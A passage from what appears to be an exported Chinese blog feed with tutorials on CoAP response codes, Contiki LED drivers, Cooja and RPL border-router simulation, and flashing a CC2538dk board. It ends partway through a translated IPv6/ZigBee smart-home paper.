PUT或者POST请求，CoAP的body部分就是一个文档，我们应该用PUT方法还是POST方法？取决于这个REST服务的行为是否是idempotent的。也就是我们采用PUT或者POST方法之后，服务器端是什么样的行为？如果产生了两个文档，那就说明这个服务不是idempotent的，因为多次使用产生了副作用了嘛；如果后一个请求把第一个请求覆盖掉了，那这个服务就是idempotent的。前一种情况，应该使用POST方法，后一种情况，应该使用PUT方法。 CoAP响应响应码 Success：2.xx 2.01 Created. 回复POST或者PUT。 2.02 Deleted. 回复DELETE，有些情况下的POST。 2.03 Valid. Indicate that the response identified by the entity-tag identified by the included ETag Option is valid. 所以，Response必须带ETag Option。 2.04 Changed. 回复POST和PUT。 2.05 Content. 回复GET。 Client Error：4.xx 4.00 Bad Request. 错误的请求。 4.01 Unauthorized 未经许可的。 4.02 Bad Option 错误的选项 4.03 Forbidden 访问被拒绝。 4.04 Not Found 未找到。 4.05 Method Not Allowed 方法不被允许。 4.06 Not Acceptable 不可接受的。 4.12 Precondition Failed 前提条件失败。 4.13 Request Entity Too Large 请求实体太大。 4.15 Unsupported Content-Format 不支持的内容格式。 Server Error：5.xx 5.00 Internal Server Error 内部服务器错误。 5.01 Not Implemented 没有实现。 5.02 Bad Gateway 错误的网关。 5.03 Service Unavailable 服务不可用。 5.04 Gateway Timeout 网关超时。 5.05 Proxying Not Supported 代理不支持。 Future Use：3.00-3.31 请求/响应模型Piggybacked Response, Separate Response, Non-confirmable Response三种类型 Piggybacked Response. 最常用的类型，Reponse内容直接放在ACK中。一个请求中携带的确认消息中携带的确认（ACK）消息的响应。 Separate Response. Server暂时没办法直接回数据(可能需要更多的时间准备)，所以先直接回Empty ACK告诉Client请求我已经收到，数据准备好再给你发送数据，避免重复请求。当Server准备好了，给Client发CON(也可以是NON)，最后Client回ACK告诉Server数据我已经收到了。如果Server在回复Clinet之前又收到Client的重传，那么也回Empty ACK。 Non-confirmable Response. Client发出NON，Server一般也回NON，但是，双方发出的消息都不要求是可靠的，即使有一方发送的数据另一方没接收到也没问题，因为不要求可靠也就是Client和Server都可以不得到数据。]]></content>
      <categories>
        <category>IoT</category>
        <category>CoAP</category>
      </categories>
      <tags>
        <tag>CoAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki LED驱动部分应用]]></title>
    <url>%2F2017%2F02%2F23%2FContiki-LED%E9%A9%B1%E5%8A%A8%E9%83%A8%E5%88%86%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Contiki为用户提供了控制LED的接口，在各个平台下也给出了对应的函数，但是由于牵扯到多个文件，这对于初学者来说也是很麻烦的事情，这篇博客将一步步解析Contiki LED控制的实现机制。 LED API函数由于contiki需要适应多种平台，所以contiki提供了底层控制LED的三大接口，分别是： 1234void leds_arch_init(void) //LED初始化函数unsigned char leds_arch_get(void) //LED状态获取函数void leds_arch_set(unsigned char leds) //LED状态设置函数 为方便各个平台对于LED的控制，在各个平台下又提供了详细的控制API接口，分别是： 12345678void leds_init(void); //LED初始化void leds_blink(void); //所有LED闪烁unsigned char leds_get(void); //获取LED的状态void leds_set(unsigned char leds); //设置LED的状态void leds_on(unsigned char leds); //LED打开void leds_off(unsigned char leds); //LED关闭void leds_toggle(unsigned char leds); //LED状态切换，反转 LED驱动文件leds.c打开位于/home/user/contiki/core目录的leds.c文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &quot;dev/leds.h&quot;#include &quot;sys/clock.h&quot;#include &quot;sys/energest.h&quot;static unsigned char leds;/*---------------------------------------------------------------------------*/static voidshow_leds(unsigned char new_leds)&#123; unsigned char changed; changed = leds ^ new_leds; leds = new_leds; if(changed &amp; LEDS_GREEN) &#123; /* Green did change */ if(leds &amp; LEDS_GREEN) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_GREEN); //方便跟踪节能设计了energest模块 &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_GREEN); &#125; &#125; if(changed &amp; LEDS_YELLOW) &#123; if(leds &amp; LEDS_YELLOW) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_YELLOW); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_YELLOW); &#125; &#125; if(changed &amp; LEDS_RED) &#123; if(leds &amp; LEDS_RED) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_RED); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_RED); &#125; &#125; leds_arch_set(leds);&#125;/*---------------------------------------------------------------------------*/voidleds_init(void)&#123; leds_arch_init(); leds = 0;&#125;/*---------------------------------------------------------------------------*/voidleds_blink(void)&#123; /* Blink all leds that were initially off. */ unsigned char blink; blink = ~leds; leds_toggle(blink); clock_delay(400); leds_toggle(blink);&#125;/*---------------------------------------------------------------------------*/unsigned charleds_get(void) &#123; return leds_arch_get();&#125;/*---------------------------------------------------------------------------*/voidleds_set(unsigned char ledv)&#123; show_leds(ledv);&#125;/*---------------------------------------------------------------------------*/voidleds_on(unsigned char ledv)&#123; show_leds(leds | ledv);&#125;/*---------------------------------------------------------------------------*/voidleds_off(unsigned char ledv)&#123; show_leds(leds &amp; ~ledv);&#125;/*---------------------------------------------------------------------------*/voidleds_toggle(unsigned char ledv)&#123; show_leds(leds ^ ledv);&#125;/*---------------------------------------------------------------------------*/ leds.h打开位于/home/user/contiki/core目录的leds.h文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#ifndef LEDS_H_#define LEDS_H_/* Allow platform to override LED numbering */#include &quot;contiki-conf.h&quot;void leds_init(void);/** * Blink all LEDs. */void leds_blink(void);#ifndef LEDS_GREEN#define LEDS_GREEN 1#endif /* LEDS_GREEN */#ifndef LEDS_YELLOW#define LEDS_YELLOW 2#endif /* LEDS_YELLOW */#ifndef LEDS_RED#define LEDS_RED 4#endif /* LEDS_RED */#ifndef LEDS_BLUE#define LEDS_BLUE LEDS_YELLOW#endif /* LEDS_BLUE */#ifdef LEDS_CONF_ALL#define LEDS_ALL LEDS_CONF_ALL#else /* LEDS_CONF_ALL */#define LEDS_ALL 7#endif /* LEDS_CONF_ALL *//** * Returns the current status of all leds */unsigned char leds_get(void);void leds_set(unsigned char leds);void leds_on(unsigned char leds);void leds_off(unsigned char leds);void leds_toggle(unsigned char leds);/** * Leds implementation */void leds_arch_init(void);unsigned char leds_arch_get(void);void leds_arch_set(unsigned char leds);#endif /* LEDS_H_ */ leds-arch.c文件打开/home/contiki/platform/cc2538dk/dev目录下的leds-arch.c 12345678910111213141516171819202122232425262728293031#include &quot;contiki.h&quot;#include &quot;reg.h&quot;#include &quot;dev/leds.h&quot;#include &quot;dev/gpio.h&quot;#define LEDS_GPIO_PIN_MASK LEDS_ALL/*---------------------------------------------------------------------------*/voidleds_arch_init(void)&#123; /* 这里解释下：LED控制使用的是PC0~PC7端口，一共有7个引脚，LEDS_GPIO_PIN_MASK被定义为LEDS_ALL， * 而在leds.h里面LEDS_ALL被定义为7，二进制展开即为111，低三位赋值为1，即这三个引脚被配置为输出通道。 * 在leds.h中定义了三种颜色的LED，分别对应低三位，即每个引脚对应一盏LED灯，当然，这得看你的开发板的具体连线。 */ GPIO_SET_OUTPUT(GPIO_C_BASE, LEDS_GPIO_PIN_MASK);&#125;/*---------------------------------------------------------------------------*/unsigned charleds_arch_get(void)&#123; //同上 return GPIO_READ_PIN(GPIO_C_BASE, LEDS_GPIO_PIN_MASK);&#125;/*---------------------------------------------------------------------------*/voidleds_arch_set(unsigned char leds)&#123; //同上 GPIO_WRITE_PIN(GPIO_C_BASE, LEDS_GPIO_PIN_MASK, leds);&#125;/*---------------------------------------------------------------------------*/ 调用过程分析我们来理清一下调用函数的过程，例如： 在PROCESS_THREAD中调用leds_on()： 12345voidleds_on(unsigned char ledv)&#123; show_leds(leds | ledv);&#125; 调用show_leds()： 123456789101112131415161718192021222324252627282930313233static voidshow_leds(unsigned char new_leds)&#123; unsigned char changed; changed = leds ^ new_leds; leds = new_leds; //方便跟踪节能设计了energest模块 if(changed &amp; LEDS_GREEN) &#123; /* Green did change */ if(leds &amp; LEDS_GREEN) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_GREEN); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_GREEN); &#125; &#125; if(changed &amp; LEDS_YELLOW) &#123; if(leds &amp; LEDS_YELLOW) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_YELLOW); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_YELLOW); &#125; &#125; if(changed &amp; LEDS_RED) &#123; if(leds &amp; LEDS_RED) &#123; ENERGEST_ON(ENERGEST_TYPE_LED_RED); &#125; else &#123; ENERGEST_OFF(ENERGEST_TYPE_LED_RED); &#125; &#125; //设置LED端口输出电平 leds_arch_set(leds);&#125; 调用leds_arch_set()： 123456voidleds_arch_set(unsigned char leds)&#123; // 若leds为1，输出高电平，leds为0，输出低电平 GPIO_WRITE_PIN(GPIO_C_BASE, LEDS_GPIO_PIN_MASK, leds);&#125; 到此，完成了LED端口的电平输出。 示例程序在/home/user/contiki/platform/cc2538dk目录下的main函数部分有如下一行代码： 1leds_init(); 即系统一启动就进行了初始化。 下面，我们定义一个进程，该进程实现LED闪烁，间隔时间为1s。在这个任务中还涉及contiki任务的基本结构，etimer的使用。具体代码如下： 在 /home/user/contiki/cc2538dk/leds_blink 目录下进行以下操作： leds_blink.c1234567891011121314151617181920212223#include &quot;contiki.h&quot; #include &quot;dev/leds.h&quot; /*---------------------------------------------------------------------------*/ PROCESS(blink_process, &quot;Blink&quot;); AUTOSTART_PROCESSES(&amp;blink_process); /*---------------------------------------------------------------------------*/ PROCESS_THREAD(blink_process, ev, data) &#123; static struct etimer et_led_blink; PROCESS_BEGIN(); while(1) &#123; etimer_set(&amp;et_led_blink, CLOCK_SECOND); // etimer溢出周期为1s PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&amp;et_led_blink)); leds_on(1); // 打开LED1 etimer_set(&amp;et_led_blink, CLOCK_SECOND); PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&amp;et_led_blink)); leds_off(1); &#125; PROCESS_END(); &#125; Makefile1234567CONTIKI_PROJECT = led_blinkall: $(CONTIKI_PROJECT)CONTIKI = ../../..CONTIKI_WITH_RIME = 1include $(CONTIKI)/Makefile.include Makefile.target1TARGET = cc2538dk 编译程序1$ make TARGET=cc2538dk 烧录程序得到bin和hex文件，将其复制到Windows使用TI Flash Programmer2 将其烧录到cc2538dk开发板上即可看到灯的亮灭情况。]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,LED］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki RPL-border-router Cooja仿真]]></title>
    <url>%2F2017%2F02%2F21%2FContiki-RPL-border-router-Cooja%E4%BB%BF%E7%9C%9F%2F</url>
    <content type="text"><![CDATA[记录一次由于Instant Contiki版本差异造成的艰难调试。谨记善于变通，不要只会按照教程的步骤进行实验。 写在前面的话此仿真参考了网上的很多教程，但是由于教程基本都是基于Instant Contiki2.7及以前版本，所以有些例程是存在差异的，而正是因为这些差异导致实验出错了。 主要参考教程：http://anrg.usc.edu/contiki/index.php/RPL_Border_Router 但是此教程基于 Contiki 2.7，我是用的是 Contiki 3.0，按照教程使用udp-server.c程序就行仿真，结果出现子节点与边界路由器没有组建网络，导致在Linux主机只能ping通边界路由器，但是不能ping通网络内部节点。找了很多的办法，最后还是找到了答案。 解决所遇到问题的关键：https://sourceforge.net/p/contiki/mailman/message/34413098/ 也就是我们需要使用udp-client.c来进行仿真实验，因为每个udp-server节点都想成为RPL根节点并且创建一个新的RPL有向无环图，这样的话就无法组建我们需要的网络完成我们的仿真。 边界路由器是指将局域网汇接到广域互联网的一种路由设备。在这个例子中，我们将测试边界路由器用于在无线传感器网络之间路由数据。 此次仿真基于Contiki的Instant Contiki开发平台，需要用到的文件在/home/contiki/examples/ipv6目录下的rpl-border-router和rpl-udp文件夹内： border-router.c slip-bridge.c httpd-simple.c udp-client.c 编译代码代码位于/contiki/examples/ipv6/rpl-border-router目录下，使用如下命令进行编译： 12$ cd /contiki/examples/ipv6/rpl-border-router$ make TARGET=sky 我们假设使用TMote Sky硬件平台进行仿真，所以TARGET=sky，编译完成将生成border-router.sky文件，这，文件将在Cooja仿真中用到。 为了演示边界路由器的功能，我们将创建一个以边界路由器为根节点的网络。建立这样一个网络需要使用到/contiki/examples/ipv6/rpl-udp目录下的udp-server.c代码，使用下面的命令来编译代码： 12$ cd /contiki/examples/ipv6/rpl-udp$ make TARGET=sky 编译完成将生成udp-client.sky，这个文件将在Cooja仿真中作为网络的子节点，这些节点与rpl边界路由根节点组成一个有向无环图。 进行仿真启动Cooja12$ cd /contiki/tools/cooja$ ant run Cooja模拟器打开后请不要关闭此命令行窗口，因为Cooja是通过命令打开的，进程还在运行，一旦关闭将会结束Cooja。 创建仿真点击 File -&gt; New Simulation，然后填写相关信息，仿真的名字，选择UDGM，然后点击创建。 添加边界路由节点填写名字，然后选择之前编译生成的sky文件，目录为：/home/user/contiki/examples/ipv6/rpl-border-router/border-router.sky，创建1个border-router节点 添加udp-rpl节点填写名字，然后选择之前编译生成的sky文件，目录为：/home/user/contiki/examples/ipv6/rpl-udp/udp-client.sky 创建4个udp-client节点： 调整显示信息 建立本地与RPL网络之间的连接选中创建的border-router节点，然后点击右键选择More tools for border router -&gt; Serial Socket(SERVER) 。 弹出窗口点击start开始监听，显示：Listening on port 60001，然后点击开始仿真，在Mote output窗口可以看到局域网已经组建，udp-client节点已经开始向border-router节点发送消息。 启用tunslip6另外打开一个命令行窗口，编译tunslip6.c 12$ cd /contiki/tools$ make tunslip6 使RPL网络和本地计算机之间的连接。 1$ sudo ./tunslip6 -a 127.0.0.1 aaaa::1/64 命令执行后将会打印如下信息，请不要关闭此窗口： 打开Cooja仿真器可以看到，监听窗口已经显示连接到127.0.0.1:39346 ping6测试网络另外打开一个命令行窗口，进行ping6测试： 1234#测试边界路由器$ ping6 aaaa::212:7401:1:101#测试udp-client节点4$ ping6 aaaa::212:7404:4:404 浏览器访问测试]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,Cooja］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki CC2538dk 串口下载程序]]></title>
    <url>%2F2017%2F02%2F18%2FContiki-CC2538dk-%E4%B8%B2%E5%8F%A3%E4%B8%8B%E8%BD%BD%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[本以为自己再也不会接触嵌入式开发这一方面的东西，没想到，毕业设计就开始重拾开发板，以后也要朝着物联网方向发展了。一块从没用过的开发板，一款之前完全不了解的物联网操作系统，一直不太熟悉的C语言，以至于下载程序就折腾了很久，在这里总结下，希望接下来能够顺利一些。 硬件连接准备连接开发板和USB转TTL模块开发板:3.3V—-USB转TTL:3.3V 开发板:TX‐‐‐‐USB转TTL:RX 开发板:RX‐‐‐‐USB转TTL:TX 开发板:GND‐‐‐‐USB转TTL:GND 安装驱动根据USB转TTL模块的芯片安装对应的驱动，常见的有PL2303和CH340，在网上找到对应驱动下载安装即可。 打开设备管理器查看端口，如果未安装成功则显示黄色感叹号。 Linux系统下烧写程序注意：本文采用Contiki官网推荐的开发工具：Instant Contiki，即为Ubuntu 14.04操作系统 将USB模块连接到虚拟机插上USB转TTL模块后，一般会默认将其挂载到windwos操作系统，这里需要点击虚拟机右下角的U盘图标再点连接将其与虚拟机连接起来。 查看/dev/ttyUSB0设备信息12$ cd /dev$ ls ttyUSB* -l 修改ttyUSB0设备使用权限1$ sudo chmod 777 ttyUSB0 也可以在其他位置编写shell脚本： 12#!/bin/bashsudo chmod 777 /dev/ttyUSB0 此处较为麻烦，我使用的是虚拟机，每次拔出USB再次插入后ttyUSB0的权限就又还原了，所以每次都得修改权限。然后，不知道什么原因，下载一次之后就无法下载，得拔出再插入，所以比较麻烦，这也是我为什么后来改用 windows 下载的原因。 切换到bootloader模式开发板需进入bootloader才能进行串口下载程序。 开发板按键的作用： Reset：复位重启系统 Down/Up/Select/Right/Left：配合例程作事件输入 Reset+Select：配合进入 bootloader 模式 Bootloader模式：按住select按键同时，按下Reset按键，led没有任何动静，证明现在处于bootloader 模式。 下载程序我们以 /home/user/contiki/examples/cc2538dk/cc2538-demo.c 为例进行烧写程序。 初次接触 contiki 的程序，demo 的代码复杂了点，为了便于理解以及方便查看效果，我们把程序修改成如下： 使用etimer模块间隔5s读取系统运行时间，然后每次打印系统时间以及Hello, world方便观察。 1234567891011121314151617181920212223242526#include &quot;contiki.h&quot;#include &lt;stdio.h&gt; /* For printf() */static struct etimer et; //定义etimer变量unsigned long sec; //用于记录系统运行时间的变量/*---------------------------------------------------------------------------*/PROCESS(hello_world_process, &quot;Hello world process&quot;);AUTOSTART_PROCESSES(&amp;hello_world_process);/*---------------------------------------------------------------------------*/PROCESS_THREAD(hello_world_process, ev, data)&#123; PROCESS_BEGIN(); while(1)&#123; etimer_set(&amp;et, 5 * CLOCK_SECOND); // 设置为每隔5s etimer溢出一次 PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&amp;et)); // 等待定时器溢出 sec = clock_seconds(); // 记录系统运行时间 单位s printf(&quot;%lu Seconds\n&quot;, sec); printf(&quot;Hello, world\n&quot;); &#125; PROCESS_END();&#125;/*---------------------------------------------------------------------------*/ 先编译后下载： 12$ make TARGET=cc2538dk$ make cc2538-demo.upload 下载出错的情况，遇到以下情况需要重新拔出USB再次插入，反正经常出现下面的情况，所以我最后还是转到Windows上进行下载了。 12ERROR: Can&apos;t connect to target. Ensure boot loader is started. (no answer on synch sequence)make: *** [cc2538-demo.upload] Error 1 12ERROR: [Errno 5] Input/output errormake: *** [cc2538-demo.upload] Error 1 使用 minicom 查看输出信息minicom 是一个串口通信工具，就像Windows下的超级终端。可用来与串口设备通信，如调试交换机和Modem等。 安装 minicom 1$ sudo apt-get install minicom 配置 minicom 1$ sudo minicom -s 进入了minicom的配置界面，使用上下键选择Serial port setup，回车，然后输入A，回车，修改 Serial Device 为 /dev/ttyUSB0，然后保存退出。 使用 minicom 1$ sudo minicom Windows 系统下烧写程序下载安装烧写工具TI Flash Programmer2 工具主要用于CC25xx，CC26xx等系列芯片的程序烧录，大家可以从TI官网下载：http://www.ti.com.cn/tool/cn/flash-programmer?keyMatch=flash%20programmer&amp;tisearch=Search-CN-Everything 由于访问可能出现问题，这里给出一个CSDN提供的下载地址：http://download.csdn.net/detail/zzfenglin/9626337 编译程序这里编译程序还是在Instant contiki上进行，因为如果要在 Windows 下编译的话还得使用IAR等开发工具，然后进行 contiki 的移植，所以我们还是使用官网推荐的方式使用 Instant contiki 吧。如上： 12$ cd /home/user/contiki/examples/cc2538dk$ make TARGET=cc2538dk 将得到的bin文件或者hex文件复制到Windwos，从虚拟机中复制文件到 Windous 需要使用 VMware 的 VMware tools 工具，可以点击菜单栏虚拟机-&gt;安装 VMware Tools，安装好之后即可像在同一个系统中复制粘贴了。 烧写程序将USB转TTL模块连接到电脑，然后打开TI Flash Programmer2。 点击左侧Refresh，找到USB设备，在左下方选择芯片型号：cc2538，中间Flash Images选择bin文件所在路径，下方 Action 勾选 Erase、Program、Verify。 按住开发板的Reset + Select：配合进入 bootloader 模式 点击TI Flash Programmer2下方播放按钮进行程序烧录，烧录成功会显示Success！ 打开串口助手查看效果]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,CC2538dk］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Contiki Cooja仿真]]></title>
    <url>%2F2017%2F02%2F14%2FContiki-Cooja%E4%BB%BF%E7%9C%9F%2F</url>
    <content type="text"><![CDATA[Cooja是Contiki操作系统中的网络模拟器，Contiki设备经常组成大型无线网络，Cooja提供一个仿真环境，使开发人员能够看到他们的应用程序运行在大型网络，使得开发和调试变得更简单。 运行cooja在终端窗口进入cooja目录1cd contiki/tools/cooja 启动cooja1ant run 如果启动失败： 123456BUILD FAILED/home/user/contiki/tools/cooja/build.xml:199: The following error occurred while executing this line:/home/user/contiki/tools/cooja/apps/mspsim/build.xml:29: -----------------Could not find the MSPSim build file. Did you run &quot;git submodule update --init&quot;?---------------- 按提示输入以下命令： 1git submodule update --init 如果再次出错： 1fatal: Not a git repository (or any of the parent directories): .git 则需要： 12git initgit submodule update --init 再次输入启动命令进行启动 1ant run 如图，cooja已经运行起来，使用Ctrl + C 可结束cooja 另外，如果你使用contiki-3.0/tools/cooja目录下的cooja时很有可能出现上面所说的错误，并且无法解决！所以请使用contiki/tools/cooja目录下的cooja进行仿真。 仿真实验创建一个新的仿真点击File菜单然后点击New simulation 设置模拟选项 Simulation name 仿真名字 Radio medium 无线介质，下拉选项： UDGM:Distance Loss 单位圆盘图：距离损失 UDGM:Constant Loss 单位圆盘图：常量损失 DGRM：有向图通信 No radio traffic 无无线信道 Mote startup delay 节点启动延时 Random seed 随机种子生成 仿真窗口 Network window 网络窗口：显示在模拟网络中的所有节点 Timeline window 时间轴窗口：显示在模拟中的所有通信事件随着时间的推移-非常方便了解什么在网络上进行 Mote output window 节点输出窗口：显示所有节点的串口打印输出 Notes window 注释窗口：为仿真编写注释的地方 Simulation control window 仿真控制窗口：启动，暂停和重新加载我们的仿真 为仿真添加节点Motes -&gt; Add motes -&gt; Create new mote type -&gt; Sky mote 创建一个新的节点类型添加描述，然后点击Browse选择我们的Contiki应用。 国际惯例我们运行一个最简单的程序，进入到/home/user/contiki-3.0/examples/hello-world目录。 加载里面的hello-world.c，点击编译，等待编译完。 然后点击create创建，在弹出的窗口填写节点基本信息： 运行程序 我们可以看到在Network window已经有了一个节点，我们再点击控制Simulation control window的start按钮，在Mote output窗口可以看到打印出来的Hello world。 至此，我们初步了解了Cooja仿真器的用法，有了这个神器，我们就可以进行各种各样的模拟仿真实验，在复杂的网络中验证我们编写的程序。]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,Cooja］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识物联网操作系统：Contiki]]></title>
    <url>%2F2017%2F02%2F13%2F%E5%88%9D%E8%AF%86%E7%89%A9%E8%81%94%E7%BD%91%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9AContiki%2F</url>
    <content type="text"><![CDATA[Contiki：面向物联网的开源操作系统。 Contiki简介 Contiki是一个开源的、高度可移植的、支持网络的多任务操作系统，由瑞典计算机科学学院的Adam Dunkels博士开发。 Contiki完全采用C语言开发，对硬件的要求极低，典型的配置下Contiki只占用约2Kbytes的RAM以及40Kbytes的Flash存储器，目前已经移植到8051单片机MSP430, AVR, ARM, PC机等硬件平台上。 Contiki支持IPv4/IPv6通信，提供了uIPv6协议栈、IPv4协议栈（uIP），支持TCP/UDP，还提供了线程、定时器、文件系统等功能。 Contiki操作系统是基于事件驱动的操作系统，在此内核上，应用程序可以在运行时动态加载，非常灵活。 Contiki实现了一种轻量级的名为protothread的线程模型，形式上类似于传统线程的编程风格，该模型中多个线程共享同一个任务栈，线程切换只有2个字节的开销。由于protothread线程模型和事件驱动机制是整个Contiki系统的运行核心。 官网：http://www.contiki-os.org/index.html Github地址：https://github.com/contiki-os/contiki Contiki配置准备下载instant ContikiInstant Contiki是基于Ubuntu的Contiki开发环境。它包含Contiki需要的所有工具和编译器。 https://sourceforge.net/projects/contiki/files/Instant%20Contiki/ 安装VMWare可以安装VMWare workstation也可以打开VMware player. 如何安装VMware player虚拟机教程 超级详细 vmware workstation 12 pro 虚拟机安装系统教程 打开instant Contiki使用VMWare Player打开instant Contiki，然后登录到该系统，密码为：user。 Contiki系统目录结构 apps: 放置contiki提供的应用，例如ftp、shell、http server等等，在项目程序开发过程中可以直接使用。使用这些应用程序的方式为，在项目的Makefile中，定义APPS = [应用程序名称]。在以后的示例中会具体看到如何使用apps。 core: 放置contiki的核心内容，调度(sys)，网络协议栈(net)，文件系统(cfs)，驱动的抽象层(dev)等等。 cpu：cpu目录下是Contiki目前支持的微处理器，例如arm、avr、msp430等等。如果需要支持新的微处理器，可以在这里添加相应的源代码。 platform：platform目录下是Contiki支持的硬件平台，例如mx231cc、micaz、sky、win32等等。Contiki的平台移植主要在这个目录下完成。这一部分的代码与相应的硬件平台相关。 examples：放置对应平台开发的示例程序。 doc: doc目录是Contiki帮助文档目录，对Contiki应用程序开发很有参考价值。使用前需要先用Doxygen进行编译。 tools: tools目录下是开发过程中常用的一些工具，例如CFS相关的makefsdata、网络相关的tunslip、模拟器cooja和mspsim等等。 其中移植主要修改的是三个目录： cpu: 添加芯片 platform: 添加平台 examples: 添加应用 示例分析国际惯例：Hello World程序 Contiki程序开发是以进程的方式实现，创建一个进程需要进行声明和定义。PROCESS(process_name, “process description”)宏用于声明一个进程；PROCESS_THREAD(process_name, event, data)宏用于定义进程执行主体。 进程执行主体代码中，必须以PROCESS_BEGIN()宏开始，以PROCESS_END()宏结束。此外，在进程中不能使用switch语句，慎重使用局部变量。 如果进程需要在系统启动时被自动执行，则可以使用AUTOSTART_PROCESSES(&amp;process_name)宏。该宏可以指定多个进程，如AUTOSTART_PROCESSES(&amp;process_1, &amp;process_2)，表示process_1和process_2都会在系统启动时被启动。 打开/contiki-3.0/examples/hello-world/目录下的hello-world.c： 1234567891011121314151617181920#include &quot;contiki.h&quot;#include &lt;stdio.h&gt; /* For printf() *//*---------------------------------------------------------------------------*//* 声明一个名为hello_world_process进程 */PROCESS(hello_world_process, &quot;Hello world process&quot;);/* 这个进程需要自动启动，即当节点启动时启动本进程 */AUTOSTART_PROCESSES(&amp;hello_world_process);/*---------------------------------------------------------------------------*//* hello_world_process进程的主体部分 */PROCESS_THREAD(hello_world_process, ev, data)&#123; /* 所有的进程开始执行前都必须要有这条语句 */ PROCESS_BEGIN(); printf(&quot;Hello, world\n&quot;); /* 所有的进程结束时都必须要有这条语句 */ PROCESS_END();&#125; 打开/contiki-3.0/examples/hello-world/目录下的Makefile文件。 1234567/* 项目名称（主文件名称） */CONTIKI_PROJECT = hello-worldall: $(CONTIKI_PROJECT)/* Contiki源文件根目录，根据您的实际情况修改 */CONTIKI = ../../* 包含Contiki的Makefile，以实现整个Contiki系统的编译 */include $(CONTIKI)/Makefile.include 编译项目在控制台/Shell中进入helloworld项目目录，运行如下命令： 1make TARGET=native 编译成功后，项目目录下就会生成hello-world.[目标平台]的目标文件，如hello-world.native。如果您使用的是Linux操作系统，可以运行如下命令查看Contiki程序运行结果： 1./hello-world.native 运行结果如下所示： 12Starting ContikiHello world :)]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]Smart Home System Based on IPV6 and ZIGBEE Technology]]></title>
    <url>%2F2017%2F01%2F23%2F%E8%AF%91-Smart%20Home%20System%20Based%20on%20IPV6%20and%20ZIGBEE%20Technology%2F</url>
    <content type="text"><![CDATA[开始学习如何阅读英文文献，刚开始只是做了简单的翻译工作，选择的论文也是与自己毕业设计的主题有关，一方面是为了探索英文文献的阅读方法，另一方面为自己的毕业设计做一些准备。目前来看，读起来比较困难，但是相信会慢慢进步的。 Smart Home System Based on IPV6 and ZIGBEE Technology 基于IPV6和ZIGBEE技术的智能家居系统 Zhenyu Zou a , Ke-Jun Li b* , Ruzhen Li a and Shaofeng Wu b a Shangdong Electric Power Engineering Consulting Institute Corp. ,Ltd., Jinan250013, China b School of Electrical Engineering, Shandong University, Jinan250061, China 摘要： Because of high-speed growth of computer control technology and communication technology, it led to the birth of smart home. ZigBee technology is intended to be a suitable standard for a low-rate wireless home control system. The remotely controlling information appliances based on Ipv6 in a home network has become a major request for nowadays consumers. In the paper an IPv6 and Zigbee home network frame is described briefly and the real products are introduced capable of home networking like home gateway and information appliance. 由于计算机控制技术和通信技术的高速发展,它引导了智能家居的诞生。ZigBee技术想要成为一个低速无线家庭控制网络的合适标准。在一个家庭网络中基于IPv6的信息家电远程控制对于今天的消费者来说已经变成一个主要的需求。在本文中简要描述了一个IPv6和Zigbee家庭网络框架，并介绍了家庭网络的真实产品，比如家庭网关和信息家电。 Keywords: Smart home; Ipv6; Zigbee; Home Gateway 关键词：智能家居；Ipv6；Zigbee；家庭网关 前言 ZigBee is an emerging network technology as a wireless communication standard that is capable to satisfy such requirements with advantage of low cost, low power and wider coverage, and therefore it is very suitable for the development and utilization of home. IPv6 offers new function such as address that is extended from 32 bits to 128bits, autoconfigura-tion and more powerful security. Given the global climate changes and limited resources, now it is the time to build energy awareness directly into nextgeneration products. Over 100 mil-lion smart me-ters slated are to be installed worldwide over the next five to seven years. This “tidal wave” forming in the horizon will have a dramatic impact on consumer products as homeowners search for cost-effective solutions for managing their energy. ZigBee作为一个无线通信标准是一种新兴的网络技术，它能够很好的满足这些需求并且有低成本、低功耗、覆盖范围广的优点，因此它非常适合用于家庭开发和利用。IPv6提供新的功能比如从32位扩展到128位的地址、自动配置以及更强大的安全。 考虑到全球气候变化和有限的资源，现在是时候树立能源意识直接进入下一代产品。在世界范围内未来五至七年将有超过1亿的智能电表被安装.这种在地平线上形成的“浪潮”将产生巨大的影响消费者产品，因为房主寻找具有成本效益的解决方案来管理他们的能量 家庭网络体系结构 The structure of the smart home network requires three different devices: coordinator, router and end device. Home environment can then be monitored, and the required data can be delivered to the coordinator or home gateway. After program execution, proper control commands will be sent from the gateway through coordinator to home appliances. Figure1 shows home network architecture. A supervisory control Intranet system which is low cost and high performance can be implemented by the ZigBee technology. A terminal node first sends the data to coordinator node and then this coordinator node retransmits the data to the 